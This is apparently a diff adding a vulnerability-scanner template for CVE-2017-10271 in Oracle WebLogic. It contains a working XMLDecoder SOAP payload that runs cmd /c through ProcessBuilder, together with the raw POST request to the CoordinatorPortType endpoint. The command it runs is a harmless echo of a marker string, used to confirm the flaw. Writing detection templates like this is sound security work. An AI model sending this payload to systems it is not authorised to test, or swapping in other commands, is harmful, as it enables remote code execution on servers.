@@ -1,0 +1,58 @@
+id: CVE-2017-10271
+info:
+  name: WebLogic CoordinatorPortType Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WebLogic Server utilizes XMLDecoder to parse serialized data. An attacker can exploit this by constructing malicious XML files to achieve remote command execution, potentially allowing them to execute arbitrary code on the server.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2017-10271
+  classification:
+    cve-id: CVE-2017-10271
+    cvss-metrics: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: weblogic,rce
+
+variables:
+  payload: |
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+        <soapenv:Header>
+            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+                <java version="1.4.0" class="java.beans.XMLDecoder">
+                    <void class="java.lang.ProcessBuilder">
+                        <array class="java.lang.String" length="3">
+                            <void index="0">
+                                <string>cmd</string>
+                            </void>
+                            <void index="1">
+                                <string>/c</string>
+                            </void>
+                            <void index="2">
+                                <string>echo a61b225af2ba8df4e45e373ae0309b7b</string>
+                            </void>
+                        </array>
+                        <void method="start"/>
+                    </void>
+                </java>
+            </work:WorkContext>
+        </soapenv:Header>
+        <soapenv:Body/>
+    </soapenv:Envelope>
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}}/wls-wsat/CoordinatorPortType HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        {{payload}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "a61b225af2ba8df4e45e373ae0309b7b"
+        part: body
+      - type: status
+        status:
+          - 200
